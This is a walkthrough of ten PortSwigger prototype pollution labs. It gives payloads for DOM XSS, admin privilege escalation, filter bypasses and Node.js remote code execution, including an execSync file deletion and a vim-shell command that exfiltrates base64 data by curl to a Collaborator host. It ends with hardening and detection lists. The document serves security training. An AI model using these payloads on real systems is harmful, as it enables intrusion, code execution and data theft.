# PortSwigger Prototype Pollution 1-10 — Property Lookup Is the Bug

This is a consolidated walkthrough of the ten PortSwigger Prototype Pollution labs.

All labs were completed in the authorized Web Security Academy environment. The main lesson is that prototype pollution is not just about writing `__proto__`; impact appears when later code reads a missing own property from the prototype chain and sends it into a sensitive sink.

## 1. Overview

| # | Lab | Source | Gadget / sink | Core payload |
|---|-----|--------|---------------|--------------|
| 1 | client-side via browser APIs | query `__proto__[x]` | `Object.defineProperty()` missing `value`, then `script.src` | `?__proto__[value]=data:,alert(1);` |
| 2 | DOM XSS via client-side pollution | query `__proto__[x]` | `transport_url` -> dynamic script | `?__proto__[transport_url]=data:,alert(1);` |
| 3 | alternative vector | query dot notation | `sequence` -> `eval()` | `?__proto__.sequence=alert(1)-` |
| 4 | flawed sanitization | one-pass key filter | `transport_url` -> dynamic script | `?__pro__proto__to__[transport_url]=data:,alert(1);` |
| 5 | third-party library | URL fragment | `hitCallback` -> `setTimeout()` | `#__proto__[hitCallback]=alert(document.cookie)` |
| 6 | server-side privilege escalation | JSON merge | `isAdmin` | `{"__proto__":{"isAdmin":true}}` |
| 7 | non-reflective detection | JSON merge | Express error `status` | `{"__proto__":{"status":555}}` |
| 8 | filter bypass | `constructor.prototype` | `json spaces`, then `isAdmin` | `{"constructor":{"prototype":{"isAdmin":true}}}` |
| 9 | server-side RCE | JSON merge | child process `execArgv` | `--eval=require('child_process').execSync(...)` |
| 10 | data exfiltration | JSON merge | `execSync()` options `shell` and `input` | `shell:"vim"`, `input:":! ... curl ...\n"` |

## 2. Triage model

A prototype pollution chain has three parts:

1. **Source:** a parser or merge operation writes to `Object.prototype`.
2. **Gadget:** downstream code reads a property that is not present on the local object.
3. **Sink:** the inherited value reaches script loading, `eval()`, authorization, error handling, or child process options.

Testing should prove all three. A successful pollution with no gadget is only a primitive, not impact.

## 3. Client-side labs

The first two labs use query-string pollution:

```text
/?__proto__[foo]=bar
```

The first gadget comes from a flawed `Object.defineProperty()` patch. The property is made unwritable and unconfigurable, but no `value` is provided, so `value` can be inherited:

```text
/?__proto__[value]=data:,alert(1);
```

The second reads `config.transport_url` when creating a script element:

```text
/?__proto__[transport_url]=data:,alert(1);
```

The third lab blocks the bracket vector but accepts dot notation:

```text
/?__proto__.sequence=alert(1)-
```

The trailing `-` repairs the JavaScript because the application appends `1` before sending the value to `eval()`.

The fourth lab uses a one-pass sanitizer. Splitting the dangerous key makes sanitization reconstruct it:

```text
/?__pro__proto__to__[transport_url]=data:,alert(1);
```

The fifth lab is a third-party library gadget found efficiently with DOM Invader. The source is the URL fragment and the gadget is `hitCallback` reaching `setTimeout()`:

```text
#__proto__[hitCallback]=alert(document.cookie)
```

## 4. Server-side labs

The server-side labs use a Node.js/Express address-change feature. User JSON is merged into a server-side object, allowing `Object.prototype` pollution.

Privilege escalation:

```json
{"__proto__":{"isAdmin":true}}
```

Non-reflective detection uses Express error handling. Pollute a distinct status code, then send malformed JSON:

```json
{"__proto__":{"status":555}}
```

If the error body reports `status` and `statusCode` as `555`, the prototype was polluted without needing reflected arbitrary properties.

The filter-bypass lab blocks `__proto__` but accepts the equivalent `constructor.prototype` path:

```json
{"constructor":{"prototype":{"json spaces":10}}}
```

Once indentation proves pollution, replace the property with:

```json
{"constructor":{"prototype":{"isAdmin":true}}}
```

## 5. Child process gadgets

The RCE lab has an admin maintenance function that spawns child processes. Polluting `execArgv` adds Node runtime arguments to the spawned process:

```json
{
  "__proto__": {
    "execArgv": [
      "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
  }
}
```

The expert lab uses `execSync()` options instead. Polluting `shell` and `input` makes `vim` run an ex command from standard input:

```json
{
  "__proto__": {
    "shell": "vim",
    "input": ":! ls /home/carlos | base64 | curl -d @- https://COLLABORATOR/\n"
  }
}
```

The same pattern reads `/home/carlos/secret` and posts the Base64 output to the Collaborator/OAST endpoint. This official path requires a receiver for the callback; this series was already solved, so it is not an unresolved blocker.

## 6. Defense and detection

Hardening:

- recursively reject `__proto__`, `constructor`, and `prototype`;
- use null-prototype objects as merge targets;
- consider `--disable-proto=throw` after compatibility testing;
- check authorization with own properties only;
- avoid string sinks such as `eval()`, dynamic script URLs, and `setTimeout(string)`;
- construct child process options explicitly with null-prototype objects;
- upgrade vulnerable parser and merge libraries.

Detection:

- `__proto__`, `constructor.prototype`, or split-key variants in query, hash, or JSON bodies;
- changed JSON indentation, error status, or charset after profile updates;
- non-admin accounts suddenly seeing admin functionality;
- maintenance tasks failing after profile changes;
- child processes receiving unexpected `--eval` or shell options;
- outbound HTTP/DNS callbacks after privileged maintenance jobs.

If a future unsolved lab truly requires Collaborator/OAST with no same-site or exploit-server alternative, it should be recorded as user-assisted pending and the rest of the series should continue.
